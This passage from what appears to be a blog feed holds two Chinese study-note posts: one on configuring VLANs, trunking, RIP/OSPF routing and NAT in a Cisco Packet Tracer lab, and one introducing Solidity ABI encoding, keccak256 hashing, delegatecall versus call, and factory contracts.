</li>
<li><p>hsrp(vrrp)——公司内部的网络系统</p>
</li>
<li><p>将pc1和pc2放入不同vlan可以实现隔离</p>
<p>(同一虚拟网之间的电脑可以通信，不同的不可通信)</p>
</li>
<li><p>vlan范围： 1-4094</p>
</li>
<li><p><strong>关于常见接口类型：</strong></p>
</li>
</ol>
<p>​	交换机常见接口类型：有Access和trunk</p>
<p>​	Access用来接入终端，电脑，打印机，服务器</p>
<p>​	trunk用在交换机与交换机之间</p>
<p>​	trunk技术解决交换机之间传输vlan数据的问题</p>
<ol start="7">
<li>命令行敲错后，跳出卡顿：ctrl+shift+1</li>
</ol>
<ul>
<li><p>三种模式：</p>
<ol>
<li><p>Enable </p>
</li>
<li><p>#</p>
</li>
<li><p>Config</p>
</li>
</ol>
</li>
<li><p>Exit 退出</p>
</li>
<li><p>查看都在#模式中；</p>
</li>
<li><p>配置文件的查看：<code>show run (running-config)</code></p>
</li>
<li><p>查看交换机的所有接口：<code>show IP interface brief</code></p>
</li>
<li><p>查看vlan：<code>show vlan</code></p>
</li>
<li><p>批量建立vlan两种办法: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vlan batch 1 to 30</span><br><span class="line"></span><br><span class="line">vlan batch 1 3 5 7 9</span><br></pre></td></tr></table></figure>
</li>
<li><p>默认情况下交换机所有端口都在：<code>vlan1</code> (1003-1005为特殊接口)（端口默认用在同一vlan中）</p>
</li>
<li><p>修改配置文件（配置在config）：</p>
</li>
<li><p>删除操作： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">no switch mode access</span><br></pre></td></tr></table></figure>


</li>
<li><p>删除vlan: <code>Switch(config)#no vlan x</code></p>
</li>
<li><p>文件的保存：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch#write</span><br><span class="line">Building configuration...</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启命令：<code>reload</code></p>
</li>
<li><p>Ping网络：计算机 &gt; conmand prompt</p>
<p>（可通过ping另一pc的地址可以查看是否通路）</p>
</li>
<li><p>Trunk技术：承载不同的vlan，一般配置在交换机与交换机之间相连的端口</p>
</li>
<li><p>还原：先<code>show run</code>，然后复制文本到别处编辑（添加no），再粘贴回去</p>
<p>（show run也可用于检查）</p>
</li>
</ul>
<h5 id="关于汇聚层步骤的补充："><a href="#关于汇聚层步骤的补充：" class="headerlink" title="关于汇聚层步骤的补充："></a>关于汇聚层步骤的补充：</h5><ul>
<li><p><code>Ip addr</code> 的地址不是电脑的地址，是第三行需要输入的交换机的地址</p>
</li>
<li><p>当需要同时配置如：<code>f0/1</code> 和 <code>f0/2</code> 两个端口时，输入 <code>interface range f0/1,f0/2</code></p>
<p>设置网关：</p>
<p><img src="https://s2.loli.net/2024/10/23/Ln2vrqQdEgyRh1B.png" alt="vlan001.png"></p>
</li>
</ul>
<h5 id="对于服务器接入交换机："><a href="#对于服务器接入交换机：" class="headerlink" title="对于服务器接入交换机："></a>对于服务器接入交换机：</h5><ol>
<li>创建vlan</li>
<li>将接计算机的接口加入相应的vlan</li>
<li>配ip</li>
<li>ip routing</li>
</ol>
<p>展示路由表：<code>Show ip route</code></p>
<p>路由器中：</p>
<ol>
<li>添加模块时记得关电源</li>
<li>添加NM-4E</li>
</ol>
<p>手机：静态路由</p>
<p>工具：动态路由</p>
<p>以下三步以下图为例：</p>
<p><img src="https://s2.loli.net/2024/10/23/yVzjvkOlrdm3q7o.png" alt="vlan002.png"></p>
<h4 id="1-接入层（3步）"><a href="#1-接入层（3步）" class="headerlink" title="1. 接入层（3步）"></a>1. <strong>接入层（3步）</strong></h4><ol>
<li><p>创建vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
</li>
<li><p>接电脑端口加入vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface f0/1</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 10</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">interface f0/2</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>


</li>
<li><p>将连接的端口配trunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface f0/3</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="2-汇聚层（2步）"><a href="#2-汇聚层（2步）" class="headerlink" title="2.  汇聚层（2步）"></a>2.  <strong>汇聚层（2步）</strong></h4><ol>
<li>点击PC——第二行mask——配置ip地址</li>
<li>在第三行填交换机地址</li>
</ol>
<h4 id="3-核心层（4步）"><a href="#3-核心层（4步）" class="headerlink" title="3. 核心层（4步）"></a>3. <strong>核心层（4步）</strong></h4><p>核心层步骤配置的是计算机的网关</p>
<ol>
<li><p>创建vlan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#exit</span><br></pre></td></tr></table></figure>


</li>
<li><p>配置trunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#interface f0/1(交换机与交换机之间的端口)</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport trunk encapsulation dot1q</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br></pre></td></tr></table></figure>


</li>
<li><p>开启三层功能(支持网络层)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#ip routing(开启三层功能，支持路由)</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置ip地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#interface vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.10.1 255.255.255.0（汇聚层步骤中设置的网关地址）</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br><span class="line">Switch(config)#interface vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.20.1 255.255.255.0</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="https://s2.loli.net/2024/10/23/ei9lZtoRkTVnEBP.png" alt="vlan003.png"></p>
<h2 id="配置内网"><a href="#配置内网" class="headerlink" title="配置内网"></a>配置内网</h2><ol>
<li><p><code>show ip route</code>查看带C的路</p>
</li>
<li><p>用<code>rip</code>加载带C的路(配置在核心交换机上)（config模式用router ip）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route rip</span><br><span class="line">Network 192.168.10.0</span><br><span class="line">Network 192.168.20.0</span><br><span class="line">Network 192.168.30.0</span><br><span class="line">Network 192.168.40.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
</li>
<li><p>上网：电脑的dns server要输入dns的网关</p>
</li>
</ol>
<ul>
<li>三个server-pc分别代表web、ftp、dns</li>
</ul>
<ol start="4">
<li><p>在ftp中设置用户名和密码</p>
</li>
<li><p>在第三台dns中分别在设置前两个名字（name处填）为 <code>www.web.com</code> 和 <code>www.ftp.com</code></p>
<ul>
<li>然后分别添加上各自的ip（Address处填）</li>
<li>配置完点击Add</li>
</ul>
<p><img src="https://s2.loli.net/2024/10/23/g7NeGRLuyYsD3Ih.png" alt="vlan004.png"></p>
</li>
<li><p>(判断能否上网)</p>
<ul>
<li>在pc——desktop——web browser处输入 <code>www.web.com</code>&#x2F;<code>www.ftp.com</code></li>
</ul>
</li>
<li><p>(登入ftp) 在conmand prompt输入如下图操作</p>
<p><img src="https://s2.loli.net/2024/10/23/VMkpuQftGOzoB62.png" alt="vlan005.png"></p>
</li>
</ol>
<h2 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h2><p>（注意设置显示接口）</p>
<p><img src="https://s2.loli.net/2024/10/23/e4obi6ECt7fVsI9.png" alt="vlan006.png"></p>
<ul>
<li><p>网段即地名</p>
</li>
<li><p><code>Ospt</code>只管公网的网段，无需管内网的网段</p>
<p>通俗讲：</p>
<ol>
<li><p>路由器：一般用在公网的；</p>
</li>
<li><p>交换机：一般用在内网的；</p>
</li>
</ol>
</li>
</ul>
<h5 id="路由器R0"><a href="#路由器R0" class="headerlink" title="路由器R0"></a>路由器R0</h5><ul>
<li><p>对于<code>f0/1</code>端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.60.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于<code>f0/0</code>端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.70.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Switch(config)#interface f0/4	</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `Router(config)#interface f0/1`</span><br><span class="line"></span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.60.2 255.255.255.0</span><br><span class="line">  </span><br><span class="line">- `Switch(config)#interface f0/7`</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line">  Switch(config-if)#ip address 192.168.70.1 255.255.255.0</span><br><span class="line">- `Router(config)#interface e1/0</span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.70.2 255.255.255.0</span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="网络要全通：（路由问题）"><a href="#网络要全通：（路由问题）" class="headerlink" title="网络要全通：（路由问题）"></a>网络要全通：（路由问题）</h6><p>所有三层设备必须要内网的所有网段</p>
<p>接下来配置外网通</p>
<p>———————内&#x2F;外网通——————–</p>
<h4 id="路由器：配置ip-配置路由"><a href="#路由器：配置ip-配置路由" class="headerlink" title="路由器：配置ip 配置路由"></a>路由器：配置ip 配置路由</h4><p>（一下名称参考上图位置，名称不固定）</p>
<h5 id="R0"><a href="#R0" class="headerlink" title="R0."></a>R0.</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router(config)#inter e1/0</span><br><span class="line">Router(config-if)#ip addr 100.100.10.1 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#inter f0/0</span><br><span class="line">Router(config-if)#ip addr 192.168.70.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interf f0/1</span><br><span class="line">Router(config-if)#ip addr 192.168.60.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure>


<h5 id="R1"><a href="#R1" class="headerlink" title="R1:"></a>R1:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.10.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip address 100.100.20.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0 0.0.0.255 area 0</span><br><span class="line">Router(config-router)#network 100.100.20.0 0.0.0.255 area 0</span><br></pre></td></tr></table></figure>


<h5 id="R2"><a href="#R2" class="headerlink" title="R2:"></a>R2:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.20.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown </span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip add 100.100.30.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.20.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure>



<p>———————外网互通——————–</p>
<h3 id="内网上网的问题（内部能够访问公网）——–nat网络地址转换"><a href="#内网上网的问题（内部能够访问公网）——–nat网络地址转换" class="headerlink" title="内网上网的问题（内部能够访问公网）——–nat网络地址转换"></a>内网上网的问题（内部能够访问公网）——–nat网络地址转换</h3><h4 id="第一步-控制内网要上网的网段；（将这些网段连上公网）"><a href="#第一步-控制内网要上网的网段；（将这些网段连上公网）" class="headerlink" title="第一步:控制内网要上网的网段；（将这些网段连上公网）"></a>第一步:控制内网要上网的网段；（将这些网段连上公网）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router(config)#access-list 1 permit 192.168.10.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.20.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.30.0 0.0.0.255</span><br></pre></td></tr></table></figure>

<h4 id="第二步：做NAT转换"><a href="#第二步：做NAT转换" class="headerlink" title="第二步：做NAT转换"></a>第二步：做NAT转换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router(config)#ip nat inside source list 1(内网） interface e1/0（公有地址的接口）</span><br></pre></td></tr></table></figure>

<h4 id="第三步：指定内外网接口"><a href="#第三步：指定内外网接口" class="headerlink" title="第三步：指定内外网接口"></a>第三步：指定内外网接口</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router(config)#interface f0/0 （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1  （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface e1/0  （公有接口）</span><br><span class="line">Router(config-if)#ip nat outside</span><br></pre></td></tr></table></figure>

<h5 id="swi0"><a href="#swi0" class="headerlink" title="swi0"></a>swi0</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.70.2</span><br></pre></td></tr></table></figure>

<h5 id="sw1"><a href="#sw1" class="headerlink" title="sw1"></a>sw1</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.60.2</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity基础003</title>
    <url>/2024/11/19/solidity%E5%9F%BA%E7%A1%80%EF%BC%883%EF%BC%89/</url>
    <content><![CDATA[<p>关键词：ABI  delegatecall create&#x2F;create2  selector try catch</p>
<h2 id="ABI编码解码"><a href="#ABI编码解码" class="headerlink" title="ABI编码解码"></a>ABI编码解码</h2><p>ABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p>
<p><strong>ABI编码：</strong></p>
<p><strong>1.</strong>   <strong>abi.encode</strong></p>
<p><strong>用于和合约交互，并将每个参数填充为32字节的数据，并拼接在一起</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line"></span><br><span class="line">  result = abi.encode(x, addr, name, array);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>编码的结果为</strong></p>
<p><code>0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code></p>
<p><strong>由于abi.encode将每个数据都填充为32字节，中间会有很多0。</strong></p>
<p><strong>2.</strong>   <strong>abi.encodePacked</strong></p>
<p><strong>将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint8类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function encodePacked() public view returns(bytes memory result) &#123;</span><br><span class="line"></span><br><span class="line">  result = abi.encodePacked(x, addr, name, array);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>编码的结果为</p>
<p><code>0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006</code>，由于abi.encodePacked对编码进行了压缩，长度比abi.encode短很多。</p>
<p><strong>3.</strong>   <strong>abi.encodeWithSignature</strong></p>
<p><strong>与abi.encode功能类似，只不过第一个参数为函数签名，比如”foo(uint256,address,string,uint256[2])”。当调用其他合约的时候可以使用。等同于在abi.encode编码结果前加上了4字节的函数选择器。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用</strong></p>
<p><strong>4.</strong>   <strong>abi.encodeWithSelector</strong></p>
<p><strong>与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节</strong></p>
<p><strong>ABI解码：</strong></p>
<p><strong>abi.decode</strong></p>
<p>abi.decode用于解码abi.encode生成的二进制编码，将它还原成原本的参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) &#123;</span><br><span class="line"></span><br><span class="line">  (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ABI的使用场景"><a href="#ABI的使用场景" class="headerlink" title="ABI的使用场景"></a>ABI的使用场景</h3><p><strong>1.</strong>   <strong>在合约开发中，ABI常配合call来实现对合约的底层调用。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4 selector = contract.getValue.selector;</span><br><span class="line"> </span><br><span class="line"> bytes memory data = abi.encodeWithSelector(selector, _x);</span><br><span class="line"> (bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line"> require(success);</span><br><span class="line"> </span><br><span class="line"> return abi.decode(returnedData, (uint256));</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<p><strong>2.</strong>   <strong>ethers.js中常用ABI实现合约的导入和函数调用。</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer);</span><br><span class="line"> /*</span><br><span class="line">   Call the getAllWaves method from your Smart Contract</span><br><span class="line">   */</span><br><span class="line"> const waves = await wavePortalContract.getAllWaves();</span><br></pre></td></tr></table></figure>



<p><strong>3.</strong>   <strong>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。</strong></p>
<h3 id="Hash在solidity的应用"><a href="#Hash在solidity的应用" class="headerlink" title="Hash在solidity的应用"></a><strong>Hash在solidity的应用</strong></h3><p>一个好的哈希函数应该具有以下几个特性：</p>
<ul>
<li><p>单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。</p>
</li>
<li><p>灵敏性：输入的消息改变一点对它的哈希改变很大。</p>
</li>
<li><p>高效性：从输入的消息到哈希的运算高效。</p>
</li>
<li><p>均一性：每个哈希值被取到的概率应该基本相等。</p>
</li>
<li><p>抗碰撞性：</p>
</li>
<li><ul>
<li>弱抗碰撞性：给定一个消息x，找到另一个消息x’，使得hash(x) &#x3D; hash(x’)是困难的。</li>
<li>强抗碰撞性：找到任意x和x’，使得hash(x) &#x3D; hash(x’)是困难的。</li>
</ul>
</li>
<li><p>生成数据唯一标识</p>
</li>
<li><p>加密签名</p>
</li>
<li><p>安全加密</p>
</li>
</ul>
<h3 id="Solidity中常用的哈希函数："><a href="#Solidity中常用的哈希函数：" class="headerlink" title="Solidity中常用的哈希函数："></a>Solidity中常用的哈希函数：</h3><ol>
<li>Keccak256</li>
</ol>
<p><strong>用法：哈希 &#x3D; keccak256(数据);</strong></p>
<p>（Sha3和Keccak256不是同一物：Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的）</p>
<ol>
<li><p><strong>keccak256来生成一些数据的唯一标识</strong></p>
</li>
<li><p><strong>弱抗碰撞性</strong>（即给定一个消息x，找到另一个消息x’，使得hash(x) &#x3D; hash(x’)是困难的）</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 弱抗碰撞性</span><br><span class="line"></span><br><span class="line">function weak(</span><br><span class="line"></span><br><span class="line">  string memory string1</span><br><span class="line"></span><br><span class="line">  )public view returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">  return keccak256(abi.encodePacked(string1)) == _msg;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol start="3">
<li><strong>强抗碰撞性（</strong>到任意不同的x和x’，使得hash(x) &#x3D; hash(x’)是困难的。）</li>
</ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 强抗碰撞性</span><br><span class="line"></span><br><span class="line">function strong(</span><br><span class="line"></span><br><span class="line">   string memory string1,</span><br><span class="line"></span><br><span class="line">   string memory string2</span><br><span class="line"></span><br><span class="line">  )public pure returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">  return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="Delegatecall"><a href="#Delegatecall" class="headerlink" title="Delegatecall"></a>Delegatecall</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>是Solidity中地址类型的低级成员函数</strong></p>
<p><img src="https://s2.loli.net/2024/11/19/vNEoWdRnyQ3xPq4.png" alt="1.png"></p>
<p><img src="https://s2.loli.net/2024/11/19/QnLzdB6Mj9FPTer.png" alt="2.png"></p>
<p> <strong>和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额</strong></p>
<p><strong>注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</strong></p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标合约地址.delegatecall(二进制编码)</span><br></pre></td></tr></table></figure>



<p>ps： 二进制编码用结构化编码函数<code>abi.encodeWithSignature</code>获得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;，逗号分隔的具体参数)</span><br></pre></td></tr></table></figure>



<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol>
<li><p>代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：<strong>代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行</strong>。当升级时，只需要将代理合约指向新的逻辑合约即可。</p>
</li>
<li><p>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合约的代理合约。</p>
</li>
</ol>
<h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p><strong>call调用&amp;dalecatecall调用</strong></p>
<p>ps:</p>
<p>函数签名为”函数名（逗号分隔的参数类型）”。例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</span><br></pre></td></tr></table></figure>



<p>首先：写一个被调用的合约C</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//将num设定为传入的_num，并且将sender设为msg.sender</span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写：发起调用的合约B</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//合约B必须和目标合约C的变量存储布局必须相同</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">	uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>接下来，分别用<code>call</code>和<code>delegatecall</code>来调用合约<code>C</code>的<code>setVars</code>函数，更好的理解它们的区别</p>
<h4 id="用call调用："><a href="#用call调用：" class="headerlink" title="用call调用："></a>用call调用：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line"></span><br><span class="line">function callSetVars(address_addr, uint _num) external payable&#123;</span><br><span class="line">//两个参数_addr和_num，分别对应合约C的地址和setVars的参数</span><br><span class="line">	(bool success,bytes memory data) = _addr.call(abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​	运行后，合约C中的状态变量将被修改：num被改为10，sender变为合约B的地址</p>
<h4 id="用dalegatecall调用"><a href="#用dalegatecall调用" class="headerlink" title="用dalegatecall调用"></a>用dalegatecall调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">    // delegatecall setVars()</span><br><span class="line">    (bool success, bytes memory data) = _addr.delegatecall(</span><br><span class="line">        abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>由于是delegatecall，上下文为合约B。在运行后，合约B中的状态变量将被修改：num被改为100，sender变为你的钱包地址。合约C中的状态变量不会被修改。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><span style = "color: blue;">当用户A通过合约B来delegatecall合约C时,执行了(   )          的函数，语境是 (  )        ,msg.sender和msg.value来自(   )         ,并且如果函数改变一些状态变量,产生的效果会作用于(   )            的变量上 </span></p>
<p>所以答案为：C,B,A,B</p>
<p>当<strong>用户 A 通过合约 B 使用 delegatecall 调用合约 C</strong> 时，以下情况会发生：</p>
<ol>
<li><strong>执行了 C 的函数</strong>：</li>
</ol>
<p> delegatecall 会调用目标合约（即合约 C）中的指定函数代码。</p>
<ol start="2">
<li><strong>语境是 B</strong>：</li>
</ol>
<p> delegatecall 会在调用者合约（即合约 B）的上下文中执行代码。这意味着合约 C 的代码会在合约 B 的存储和上下文中运行，就像这段代码属于 B 一样。</p>
<ol start="3">
<li><strong>msg.sender</strong> <strong>和 msg.value 来自 A</strong>：</li>
</ol>
<p> delegatecall 保留了原始调用者的信息。也就是说，msg.sender 和 msg.value 都来自于发起调用的用户 A。</p>
<ol start="4">
<li><strong>状态变量的影响作用于 B 的变量上</strong>：</li>
</ol>
<p> 由于 delegatecall 在调用合约 B 的存储和上下文中执行，所以任何状态变量的修改都只会影响合约 B 中的变量，不会影响合约 C。</p>
<h2 id="在合约中创建新合约"><a href="#在合约中创建新合约" class="headerlink" title="在合约中创建新合约"></a>在合约中创建新合约</h2><p>智能合约同样也可以创建新的智能合约</p>
<p>去中心化交易所uniswap就是利用工厂合约（PairFactory）创建了无数个币对合约（Pair）</p>
<h3 id="关于工厂合约"><a href="#关于工厂合约" class="headerlink" title="关于工厂合约"></a>关于工厂合约</h3><p><code>Pair</code>合约很简单，包含3个状态变量：<strong>factory</strong>，<strong>token0</strong>和<strong>token1</strong>。</p>
<p>构造函数<strong>constructor</strong>在部署时将<strong>factory</strong>赋值为工厂合约地址。<strong>initialize</strong>函数会由工厂合约在部署完成后手动调用以初始化代币地址，将<strong>token0</strong>和<strong>token1</strong>更新为币对中两种代币的地址。</p>
<p><strong>工厂合约（PairFactory）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有代币地址。</strong></p>
<p><strong>PairFactory</strong>合约只有一个<strong>createPair</strong>函数，根据输入的两个代币地址<strong>tokenA</strong>和<strong>tokenB</strong>来创建新的<strong>Pair</strong>合约。其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pair pair = new Pair();</span><br></pre></td></tr></table></figure>

<p>就是创建合约的代码</p>
<p>当 PairFactory 合约调用 new Pair() 来创建一个新的 Pair 合约实例时，Pair 合约的 msg.sender 将是 PairFactory 合约本身</p>
